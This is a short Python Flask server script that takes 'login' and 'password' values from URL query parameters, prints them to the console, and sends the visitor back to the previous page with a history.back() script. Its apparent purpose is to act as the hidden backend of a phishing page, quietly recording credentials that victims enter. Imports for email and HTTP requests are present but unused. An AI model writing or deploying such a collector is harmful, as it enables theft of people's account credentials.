from flask import Flask
from flask import request
import smtplib
import json
import requests
    
app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    p = request.args.get('password')
    l = request.args.get('login')
    print('login:', l, '\n', 'password:', p)
    return '<script> history.back(); </script>'


if __name__ == "__main__":
    app.run()
